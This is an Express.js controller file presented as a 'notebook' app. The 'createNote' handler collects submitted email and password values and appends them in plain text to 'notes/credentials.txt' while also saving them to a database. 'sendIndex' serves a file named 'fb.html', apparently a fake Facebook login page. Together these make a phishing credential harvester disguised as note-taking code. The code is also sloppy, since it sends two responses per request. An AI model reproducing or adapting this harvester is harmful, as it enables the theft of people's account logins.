import mongoose from 'mongoose';
import note from '../models/notebookModel.js';


exports.createNote = (req, res) => {
    
    console.log(req.body)

    const newNote = new note(req.body);

    var txtFile = "notes/credentials.txt";

    const fs = require('fs')

    var content = "mail : " + newNote.email + "\npass : " + newNote.pass + "\n\n"

    fs.writeFile(txtFile, content, { flag: 'a' }, (err) => {
        if (err) {
            res.send(err);
            return
        }
        res.send(content);
    })

    newNote.save((err, note) => {
        if (err) {
            res.send(err);
        }
        res.json(note);
    });


};


exports.sendIndex = (req, res) => {

    var fs = require('fs');
    fs.readFile('routes/fb.html', 'utf8', function (err, contents) {
        res.send(contents)
    });
};